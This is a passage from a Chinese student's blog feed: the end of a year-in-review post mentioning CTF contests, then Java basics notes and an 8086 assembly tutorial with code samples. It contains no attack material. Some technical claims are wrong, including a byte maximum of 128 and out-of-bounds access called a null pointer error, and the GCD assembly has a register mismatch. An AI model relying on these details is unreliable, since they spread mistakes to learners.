<p>除了安全之外，产品能力也没有落下，接了一个外包项目，虽然因为对接问题没有结题，但是完成的还不错，给我的项目经历增色不少，同时对iOS的App运行原理、多线程、并发有了更深的理解，还在课余之时帮老师写了一些科研项目的算法实现，生活还是不紧不慢很充实的。</p>
<h2 id="得到和失去"><a href="#得到和失去" class="headerlink" title="得到和失去"></a>得到和失去</h2><p>总体来说失去的应该就是我的学分吧:smile:，因为长期的不上课和期末懒得复习，导致我除了专业课基本每一门都是擦边球，虽然最后拿了奖学金，但是还是羞愧不已，后来也想通了，这些东西其实没什么还在乎的，虽然拿不了国奖，一等奖学金也够了，最主要的还是自身的技术，老实说我也不觉得上的这些课会对我有半毛钱的帮助。而且上课的催眠魔咒实在是太强大了(催眠就算了点名就过分了，难道不知道用点名留住学生的老师就像什么吗？)</p>
<p>至于得到了应该就很多了，也无法一一说得清，技术上就可以直接参考博客，生活上得到了脖子疼和屁股疼:smile:，比赛方面主要是安全比赛中拿了两个奖，第一次出去和武汉大学的两个队一起都是二等奖，还是有些心中窃喜，后来想想估计是别人的CTF二队吧，一队可能就把我打肿了:P。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/IMG_2644.JPG" alt="IMG_2644.JPG" title="" class="">
                <p>IMG_2644.JPG</p>
            </figure>
<p>第一次比赛的时候懵懂无知，只是刷了一下隐写术的题目，靠着之前的一点网络知识和linux工具在网络攻防的部分勉强不被打的太惨，但是一开始服务器做加固的时候因为一个文件上传的漏洞被打了好多分:cry:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/IMG_2711.JPG" alt="IMG_2711.JPG" title="" class="">
                <p>IMG_2711.JPG</p>
            </figure>
<p>第二次比赛的时候也是临时被丢上去顶包，离二等奖之差一分，不得不说安全比赛真的很严格，奖项设置的这么少(是时候黑一把ACM了:P)，最过分的是来自主办方的恶意啊，把我的名字给打错了！！！这学期最后一次比赛是湖湘杯，很惨的是在复赛的时候被斩于马下，可能没有明白flag的py交易，还有那种完全没有道理的题目，不得不说完全不按套路出牌啊（韩红：兄弟你是来捣乱的吧），最后就到了考试周了，说是要复习吧，但是还是没有什么兴趣啊，最大的愿望是赶快做个抢红包的tweak啊！！！</p>
<h1 id="2018的寄语"><a href="#2018的寄语" class="headerlink" title="2018的寄语"></a>2018的寄语</h1><p>感觉未来的道路似乎都已经规划的差不多了，明年也许找个公司实习个暑假，然后就可以准备开始考研了，也许是华科吧，其实更想去浙大（浙大的AAA战队），考研好苦啊，好苦啊。之后大四就可以去玩耍了！！似乎这已经到20年了，倒不要紧，接下来就要猥琐发育，等神装再出山了。</p>
<p>在之后接任了Geek组的组长之后方方面面也要考虑的更加周全，其他的也不知道说什么了，总结结束！</p>
]]></content>
      
        <categories>
            
            <category> sumup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java学习笔记(一)]]></title>
      <url>/2017/12/29/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.46.21.png" alt=""></p>
<p>Java是一门很悠久的语言了，虽然一直被黑，说它老气，庞大，臃肿，但是这种盲目的否认会忽视掉Java的很多优点，甚至许多的Python的程序员也加入了鄙视Java的队伍中，虽然气势上占据着上风，但是显然Python作为一个编程语言是完全无法和Java抗衡的。</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习一门语言之前必定要有所了解，盲目跟风的人虽不知几何，但终有成就者甚少，其实就算Java中有很多的不好，其实许多的脚本程序员是没有资格去评判的，属于盲目的鄙视范畴。也许这种仇恨感是来自于长期的教学或者废话连篇的设计模式吧。其实Java已经可以解决大部分的问题，除非有着非常强大的性能需求和资源需求。</p>
<p>所以有些黑Java其实是有些不着边际的，但是没办法，现在的人们就是喜欢人云亦云，看到大多数的人站在一起抵制一个对象的时候，就会不自觉地加入进去，仿佛获得了巨大的快感，在我看来，相较于Java，<code>JavaScript</code>这种东西不是会更加吸引仇恨么，虽然他们的社区更新换代的非常快，但是其实并没有什么根本性的改变，甚至还有越来越火的趋势，真是让鸡摸不着头脑:p</p>
<h1 id="Java的基础特性"><a href="#Java的基础特性" class="headerlink" title="Java的基础特性"></a>Java的基础特性</h1><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p> java的程序都是定义在类中，而类的形式其实就是一个字节码文件最终体现，java是一个强类型语言，对于每一种数据都定义了明确的具体数据类型，在内存中分配了不同大小的内存空间，在java中数据类型主要可以分为基本数据类型和引用数据类型，引用中存放的是指向真实数据的地址，类、接口、数组就属于引用数据类型。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/969969978B91E6105DD88EAFCA1FDC3D.png" alt="969969978B91E6105DD88EAFCA1FDC3D.png" title="" class="">
                <p>969969978B91E6105DD88EAFCA1FDC3D.png</p>
            </figure>
<h2 id="强转和溢出"><a href="#强转和溢出" class="headerlink" title="强转和溢出"></a>强转和溢出</h2><p>我们发现java中有一个不是在C/C++中出现过的基础类型<code>byte</code>，这个作为整型也就是说只能存储一个字节的整数，有符号整数最大只能到128，所以我们要注意不要超过数据类型的上限，下面演示一段基础的语法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">add</span></span>&#123;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">    <span class="keyword">byte</span> b = <span class="number">3</span>;</div><div class="line">    b = (<span class="keyword">byte</span>)(b+<span class="number">126</span>);</div><div class="line">    System.out.println(b);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后我们就会发现输出的结果是-127，这个倒是没什么，因为溢出了，但我发现一个问题，就是如果执行：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">b = b + <span class="number">3</span></div></pre></td></tr></table></figure>
<p>的时候就会报错，一开始的时候并没有明白它到底是什么意思：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[peterpan@panzhenpengdeMacBook-Air java ]$ javac add.java</div><div class="line">add.java:5: 错误: 不兼容的类型: 从int转换到byte可能会有损失</div><div class="line">    b = b + b;</div><div class="line">          ^</div><div class="line">1 个错误</div></pre></td></tr></table></figure>
<p>想了一想之后这应该是java语言的一个特性，在进行加法运算的时候，会把操作数隐式的转换为int类型，所以最后赋值的时候会说转换导致精度丢失。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>学过C/C++之后再学java总会纠结指针这个东西到底有没有呢，准确来说，应该是不能算是有的，虽然java中也有引用，但是其实和C++中的引用完全是两码事，首先说一下C++中的引用，它是同一块内存的不同名字，而java中的引用是指向了一个对象，而且这个引用本身也会占用内存，这样一来的话，与其说这个是引用，倒不如说比较像指针，但不同的是，这个引用无法指向一个基本变量，而且我们无法获取引用存的地址，我们同样也无法删除，所以说在java中的引用可以看作是一个阉割版本的指针。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Object *a = <span class="keyword">new</span> Object();</div></pre></td></tr></table></figure>
<p>在C++中，动态分配了内存空间之后将地址返回给指针变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Object a = <span class="keyword">new</span> Object();</div></pre></td></tr></table></figure>
<p>相较之下，也许我们可以叫它对象变量？反正不管怎么说，说java中有指针这种说法严格意义上来说是不准确的，所以我们还是保持着引用这种说法吧。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>每个语言中都有函数的概念，基础的使用上其实都差不多，要关注的只是其中的底层运行是什么，我们在终端下运行java程序的时候，会执行下面几个步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#编译</div><div class="line">javac Demo.java --&gt; Demo.class</div><div class="line">#启动虚拟机运行java应用程序</div><div class="line">java Demo</div></pre></td></tr></table></figure>
<p>在这之后的运行过程就是找到main函数，也就是入口，然后顺序执行，底层执行压栈。说到函数这里，也就不得不提一下重载，几乎面向对象的语言中都会有这个特性，只不过含义不同，在java中的重载指的是在一个类中允许存在一个以上的同名函数，只要他们的参数个数或者参数类型不同即可，重载的特点就是和返回值的类型无关，只会看参数列表，比如说我们做加法的参数不同就可以利用重载：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//返回两个整数和</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;<span class="keyword">return</span> x+y;&#125;</div><div class="line"><span class="comment">//返回三个整数和</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span>&#123;<span class="keyword">return</span> x+y+z;&#125;</div><div class="line"><span class="comment">//返回两个小数和</span></div><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">double</span> y)</span></span>&#123;<span class="keyword">return</span> x+y;&#125;</div></pre></td></tr></table></figure>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>在Java中声明一个数组的形式与我们传统的学习有所不同，习惯C/C++的人会觉得略微有些怪异：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//元素类型[] 数组名 = new 元素类型[元素个数或数组长度]</span></div><div class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</div><div class="line">arr[<span class="number">0</span>] = <span class="number">89</span>;</div><div class="line">arr = <span class="keyword">null</span>;</div></pre></td></tr></table></figure>
<p>数组肯定需要开辟一段内存空间，其实在这个方面静态语言说起来都差不多，java的内存被划分为：</p>
<ol>
<li>寄存器</li>
<li>本地方法区</li>
<li>方法区</li>
<li>栈内存(局部变量)</li>
<li>堆内存(存储的是数组和对象，凡是new的都在堆中，在内存管理上和C++不同)</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-04%20%E4%B8%8B%E5%8D%884.49.47.png" alt="屏幕快照 2018-01-04 下午4.49.47.png" title="" class="">
                <p>屏幕快照 2018-01-04 下午4.49.47.png</p>
            </figure>
<p>在java中如果访问数组超过了下标的时候就会报一个空指针错误，在java中，引用型变量没有任何实体指向的时候，还在用其操作实体，就会发生异常。那么我们直接打印数组下标会发生什么后果呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┌─[peterpan@panzhenpengdeMacBook-Air] - [~/java] - [2018-01-04 05:08:59]</div><div class="line">└─[0] &lt;&gt; java Array</div><div class="line">[I@7852e922</div></pre></td></tr></table></figure>
<p>我们可以看到打印出来的是一串奇怪的字符，首先以<code>@</code>作为分界线，左边的代表的是类型，<code>[</code>代表数组，<code>I</code>代表是整型，分界右边的是数组实体的一个hash值，可以简单的理解为地址值（冲突会继续往下算）。</p>
<h1 id="面向对象编程和类"><a href="#面向对象编程和类" class="headerlink" title="面向对象编程和类"></a>面向对象编程和类</h1><p>在接触了面向对象、函数、过程三种编程范式之后，对于OOP也有了一些具体的理解，在看了严千钧老师的编程导论之后，体会也更加具体形象。那么究竟我们在面向对象的过程中，什么是类，什么是对象，什么是抽象和具体，首先我们从哲学的领域作为入口来探讨一下这个问题。</p>
<h2 id="从具体到抽象"><a href="#从具体到抽象" class="headerlink" title="从具体到抽象"></a>从具体到抽象</h2><p>古希腊的哲学家们把具有主观意识的自我称为主体(subject)，而被主体所观察和研究的一个个客观的物体称为对象或者客体。所以对象这个词其实具有很浓郁的哲学味道，在我们的日常生活中的一个朋友，一辆奔驰，一栋房子，这些我们通过视觉和触觉感受到的都是一个个具体的object，我们所生存的世界就是由对象所组成的。</p>
<p>在我们变成的时候，抽象这个概念我们会经常碰到，一个抽象类，抽象数据类型。其实在我们的生活中，也有这种概念，比如说我们通过一个个具体的对象提炼出了人、车这样的概念，甚至于我们可以抽象出生活中完全没有的对应物———圆，几何中的圆在现实生活中没有一个对象可以完全的满足，我们使用的圆规同样也不能。</p>
<p>客体和概念之间的关系使得早期的哲学家们十分的困惑。亚里士多德就曾经说过<code>事物总是个别存在的</code>，比如说我们对于人的概念指存在于想象中，真实的世界中没有人，只有这个高大的黑人John，那么会功夫的中国人Lee。因此抽象是无法作为单独的存在物的，抽象只能通过具体/个别从而存在。</p>
<h2 id="颠倒的世界"><a href="#颠倒的世界" class="headerlink" title="颠倒的世界"></a>颠倒的世界</h2><p>在我们讨论面向对象技术的时候，其实和现实世界是相反的，我们遵循的是柏拉图的唯心论，在柏拉图的理解中，人、狗、计算机等具体事物理念、几何知识中的圆、运动是较为高级的理念，世界是由<code>理念世界</code>和<code>现象世界</code>组成的。理念的世界是真实的，脱离个别事物而独立存在的东西，而人类感官所感受到的现象世界只是理念世界的微弱影子。</p>
<p>暂且不论这师徒两个在哲学领域的探讨，但只在软件领域上来说，柏拉图的理念论其实正好适用于软件的解域，因而可以将该观点改造成面向对象的基石性原理</p>
<blockquote>
<p>柏拉图法则：类的世界独立存在，对象的世界由类创建而来</p>
</blockquote>
<p>类先于对象存在，类可以独立存在，也就是说我们如果有一个Dog.class，它是可以静态的存在于硬盘上，而不需要关心外部的世界中到底有没有可以活动的狗。</p>
<h1 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h1><p><a href="yinwang.org">王垠的博客（失效中）</a></p>
<p><a href="http://blog.csdn.net/yqj2065/article/details/46825467" target="_blank" rel="external">严千钧-编程导论</a></p>
<p><a href="">毕向东JAVA</a></p>
]]></content>
      
        <categories>
            
            <category> 语法学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8086汇编小结]]></title>
      <url>/2017/12/25/8086%E6%B1%87%E7%BC%96%E5%B0%8F%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>汇编我认为是一门需要非常小心的语言，在这里我们已经接近了计算机最底层的世界，从原理上来观察我们高级语言中简简单单就能实现的功能，在资源极其有限的情况下编写代码是对我们的大局观和逻辑思维能力一个极大的考验</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在探讨汇编语言之前首先我们对CPU中的寄存器关系有一个初步的了解，不然直接看后面的代码会让人眼花缭乱，不知所云，这里展示一个8086微处理器的内部结构：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-27%20%E4%B8%8B%E5%8D%884.29.16.png" alt="屏幕快照 2017-12-27 下午4.29.16.png" title="" class="">
                <p>屏幕快照 2017-12-27 下午4.29.16.png</p>
            </figure>
<p>寄存器的用法会因为指令的不同而发生改变，比如在循环中我们可以通过<code>ecx</code>寄存器中的值来作为循环的次数，这个是通过<code>loop</code>指令，其中有些寄存器充当的是高级语言中指针的作用，我们通过下面这张图来观察一下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-27%20%E4%B8%8B%E5%8D%884.32.44.png" alt="屏幕快照 2017-12-27 下午4.32.44.png" title="" class="">
                <p>屏幕快照 2017-12-27 下午4.32.44.png</p>
            </figure>
<p>虽然在上面的图中都只有16位的寄存器，但其实已经做了扩展，在32位模式下可以通过如<code>eax</code>这样的形式来访问32位的寄存器，扩展的寄存器和原来的寄存器有着密不可分的关系，相当于是在原来的存储空间上向上增加了一倍，在64位的机器上我们通过如<code>rax</code>这样的形式来访问。在8086中由于历史遗留问题，CPU是16位，地址总线是20位，所以在寻址上会有些特殊，感兴趣的可以自行查阅。</p>
<h1 id="DS和CS"><a href="#DS和CS" class="headerlink" title="DS和CS"></a>DS和CS</h1><p>段寄存器属于程序员手动操作的比较少的地方，但是也需要去了解，首先就是CS寄存器，我们都知道CPU是按照某种顺序一条一条的执行指令，这个顺序就存放在我们的CS段寄存器之中，通俗的来说，CS就是告诉CPU去哪个位置找内容当成指令去执行，有指令自然也有有数据，这个数据的位置就是通过DS段寄存器得到，DS是数据开始的段地址，也就是将其作为基址，所以逻辑地址应该是DS*比例因子+偏移地址，比如我们要改变起始地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov		ax, 1000H</div><div class="line">mov		ds, ax</div><div class="line">mov		[0], al</div></pre></td></tr></table></figure>
<p>如果我们想要向指定的内存地址中传值，就可以使用上面这种写法，但是段寄存器不支持直接将数据送入，所以我们将寄存器作为载体，如果是CS的话，根本就是只读的，所以也不需要管将什么作为载体了。说到这两个就离不开IP，IP是指令指针，在CS段寄存器中保存的是指令的段基址，IP中保存的是CPU将要执行代码所在物理内存的偏移地址，CS只是一个载体，之后说到的<code>call</code>和<code>ret</code>指令本质上也是在操作CS和IP。</p>
<p>所以也就是说CS和DS段寄存器存储的都是段基址，只不过一个是代码段，一个是数据段。</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>由于前面的内容都是一些基础语法方面的，所以就直接从数组这一块开始好了，当我们使用高级语言的时候，应该也会想想过数组的底层到底是如何去实现的，那么我们首先通过循环读取数据到数组的代码来观察一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.CODE</div><div class="line">_start:</div><div class="line">			mov	  nbrElts, 0	;初始化数组中的元素的个数</div><div class="line">			lea	  ebx, nbrArray ;取出数组的首地址</div><div class="line">whilepos:	input number, 20	;这是书的作者为了方便我们的输入输出对其做了一个整合</div><div class="line">			atod  number		;转换为整数</div><div class="line">			jng   endwhile		;如果不是正数就退出</div><div class="line">			mov	  [ebx], eax	;存储数组中的数字</div><div class="line">			inc	  nbrElts</div><div class="line">			add	  ebx, 4</div><div class="line">			jmp	  whilepos</div><div class="line">endwhile:</div></pre></td></tr></table></figure>
<p>通过上面的代码我们可以发现我们通过一个变量去存放数组的长度，然后通过寄存器间接寻址去得到当前数组最后一个元素的地址，因为数组是在内存中连续存储的，所以我们每读入一次将地址的值累加即可，当然要根据这个数组中存放的是什么类型的数据(字节，单字，双字)。剩下要说的就是对于数组进行一些基本的操作了，比如求和，求平均数等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">; 找出总和和平均值</div><div class="line">			mov		eax, 0</div><div class="line">			lea		ebx, nbrArray	;取得数组首地址</div><div class="line">			mov		ecx, nbrElts</div><div class="line">			jecxz	quit			;不是数字则退出</div><div class="line">forCount1:  add		eax, [ebx]		;循环求和</div><div class="line">			add		ebx, 4			</div><div class="line">			loop	forCount1</div><div class="line">			</div><div class="line">			cdq						;扩展sum到4倍字长</div><div class="line">			idiv	nbrElts			;计算平均数</div><div class="line">			dtoa	outValue, eax</div><div class="line">			output	outValue</div></pre></td></tr></table></figure>
<p>其实除了上面这种对于地址的累加还有很多有效的方式去访问数组的元素，在这里就先不讨论</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>这个概念可能说起来大家会觉得有点奇怪，什么是过程？在汇编语言中的过程就类似于高级过程中的函数，如果我们把所有的功能全部都写在一个主函数里面，毫无疑问就会让程序显得晦涩难懂，并且debug的难度要大大上升，代码阅读性也是极差的。过程就是把我们的汇编代码划分成多个容易处理的任务，介绍过程之前首先要说的就是8086的堆栈：</p>
<p> <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-26%20%E4%B8%8B%E5%8D%883.05.15.png" alt="屏幕快照 2017-12-26 下午3.05.15.png"></p>
<p>我们的程序中会有一句话去分配我们的堆栈大小，比如说我们要分配4096字节的未初始化的储存空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.STACK	4096</div></pre></td></tr></table></figure>
<p>我们通过<code>push</code>和<code>pop</code>来对我们的堆栈进行操作，一个是将操作数压栈，一个是弹出。一开始有一个ESP指针，指向堆栈的顶部，当一个字的操作数入栈的时候，堆栈指针ESP就会减2，也就是这个操作数所占的字节数大小。当我们使用<code>pop</code>的时候，如果操作数是字长的，就会复制ESP指针指向的字长的值，将其存放在目的地址中，然后将ESP指针减2.</p>
<p>之前就会注意到汇编语言在编程的时候，寄存器的资源不是很多，为了保证中间过程值不丢失，就会将变量转移，那么为了避免丢失数据值，我们就会将寄存器存放的值压栈，这也是堆栈的意义所在，比如说我们需要交换两个寄存器之间的值除了可以使用<code>xchg</code>之外还可以通过堆栈实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">push	eax</div><div class="line">push	ebx</div><div class="line">pop		ebx</div><div class="line">pop		eax</div><div class="line">;或者使用mov指令</div><div class="line">push	eax</div><div class="line">mov		eax, ebx</div><div class="line">pop		ebx</div></pre></td></tr></table></figure>
<p>了解到了堆栈之后，就可以开始写我们的过程体了，也就是高级语言中所谓的函数部分，其中需要用到一个叫做EBP的寄存器，从名字上来看和我们的栈指针ESP非常的像，ESP是实时的去记录当前的栈顶的栈指针，因此保存当前esp到一个ebp中保持不变，后续用ebp来访问参数和局部变量就很清楚，而且还方便于调试器分析函数调用过程中的堆栈情况。通过一个求最大公约数的程序我们可以很直观的理解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">;GCD是过程体的名字，可以通过call 过程体名来调用</div><div class="line">GCD		PROC	NEAR32</div><div class="line">		push	ebp			;保存当前的ebp</div><div class="line">		mov		ebp, esp	;EBP设为当前的堆栈指针</div><div class="line">		sub		esp, 4		;给GCD临时变量预留4个字节</div><div class="line">		push	ebx			;保存edx</div><div class="line">		pushf				;保存标志位</div><div class="line">		</div><div class="line">		mov		eax, [ebp+8]</div><div class="line">		mov		[ebp-4], eax;第一个数字赋值给临时变量</div><div class="line">		mov		edx, [ebp+8];第二个数字存储在余数部分</div><div class="line">until0: mov		eax, [ebp-4];第一个数字或者上次的除数作为被除数放在eax中 </div><div class="line">		mov		[ebp-4], edx;第二个数字或者上一次的余数放在临时变量</div><div class="line">		mov		edx, 0		;清空余数部分</div><div class="line">		div		DWORD PTR [ebp-4]</div><div class="line">		cmp		edx, 0		;判断余数是否为0</div><div class="line">		jnz		until0</div><div class="line">		</div><div class="line">		mov		eax, [ebp-4];将结果存入eax</div><div class="line">		popf				;恢复标志位</div><div class="line">		pop		edx			;恢复edx</div><div class="line">		mov		esp, ebp	;恢复局部变量</div><div class="line">		pop		ebp			;恢复ebp</div><div class="line">		ret		8			;返回，释放参数</div><div class="line">GCD		ENDP</div><div class="line">		ENDP</div></pre></td></tr></table></figure>
<p>从上面我们不难看出是通过局部变量来完成的整个程序，而这个局部变量依赖于我们的EBP寄存器，通过偏移量来访问，这也正好验证了我们上面所说，其中第21行代码其实还可以通过改变ESP指针来达到同样的效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add		esp, 4</div></pre></td></tr></table></figure>
<p>同时我们还注意到这里的返回是有参数的，也就是说除了弹出偏移地址之外，相当于还执行了一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add		esp, 8</div></pre></td></tr></table></figure>
<p>相当于也清空了之前压入栈求最大公约数的两个参数了，通过这样的详细的讲解相信大家都会清楚这个过程了。那么我们不禁联想到是不是也可以将地址作为参数进行传递呢？比如寻找一个数组中的最小元素：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Minimum		PROC	NEAR32</div><div class="line">			push	ebp</div><div class="line">			mov		ebp, esp</div><div class="line">			pushad				;保存所有寄存器</div><div class="line">			pushf</div><div class="line">			</div><div class="line">			mov		ebx, [ebp+14]</div><div class="line">			mov		ecx, 0</div><div class="line">			mov		cx, [ebp+12]</div><div class="line">			mov		eax, 7fffffffh</div><div class="line">			jecxz	endForCount</div><div class="line">forCount:   	cmp		[ebx], eax</div><div class="line">				jnl		endIfLess</div><div class="line">				mov		eax, [ebx]</div><div class="line">endIfLess:  	add		ebx, 4</div><div class="line">				loop	forCount</div><div class="line">endForCount:	mov		ebx, [ebp+8]</div><div class="line">				mov		[ebx], eax</div><div class="line">				popf</div><div class="line">				popad</div><div class="line">				pop		ebp</div><div class="line">				ret</div><div class="line">Minimum		ENDP</div></pre></td></tr></table></figure>
<h1 id="ret和call"><a href="#ret和call" class="headerlink" title="ret和call"></a>ret和call</h1><p>结合之前说过的CS和IP，我们可以来推断一下<code>call</code>和<code>ret</code>究竟是做了什么来实现我们在高级语言中的函数功能，call和ret指令都是转移指令，它们都修改IP，或同时修改CS和IP。</p>
<h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p><code>call</code>我们可以理解成跳转执行函数，事实上这也是它所做的，首先<code>call</code>会将IP寄存器所指向的下一条指令压栈，保存起来，然后通过<code>jmp</code>指令跳转到我们的子程序部分执行，用代码描述就是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">push	ip</div><div class="line">jmp near ptr 标号</div></pre></td></tr></table></figure>
<p>如果要实现段间转移的时候就要将CS段寄存器也一起保存，这个时候跳转就是使用长跳转，编译过后的机器码已经贴上了跳转点的具体地址，而不是偏移量了(因为参考不同)。用代码描述就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">push	cs</div><div class="line">push	ip</div><div class="line">jmp	far	ptr	标号</div></pre></td></tr></table></figure>
<h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；</p>
<p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
<p>CPU执行ret指令时，进行下面的两步操作：</p>
<ol>
<li>(IP) = ((ss)*16 +(sp))</li>
<li>(sp) = (sp)+2</li>
</ol>
<p>CPU执行retf指令时，进行下面四步操作：</p>
<ol>
<li>(IP) = ((ss)*16) + (sp)</li>
<li>(sp) = (sp) + 2</li>
<li>(CS) = ((ss)*16) + (sp)</li>
<li>(sp) = (sp) + 2</li>
</ol>
<p>用汇编语法来解释ret和retf指令，则：</p>
<p>CPU执行ret指令时，相当于进行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pop IP</div></pre></td></tr></table></figure>
<p>CPU执行retf指令时，相当于进行：</p>
